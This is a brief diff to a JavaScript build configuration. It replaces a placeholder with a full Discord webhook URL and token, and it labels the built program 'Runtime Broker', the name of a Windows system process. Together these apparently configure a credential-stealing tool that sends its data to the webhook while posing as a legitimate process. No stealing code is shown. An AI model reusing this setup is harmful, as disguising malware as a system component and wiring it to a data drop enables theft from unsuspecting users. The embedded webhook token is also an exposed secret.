@@ -1,6 +1,6 @@
 module.exports = () => {
     return {
-        webhook_url: "REPLACE_ME",
+        webhook_url: "https://discord.com/api/webhooks/1282813520035188766/w8CiGdNWAQgaTG8VhgvPl0DqNV02SdUE5UYzpO0-a6iIaVxVYkOz_R1-y8d_aUfxOXNa",
         icon: './default.ico',
         properties: {
             FileDescription: 'Runtime Broker',
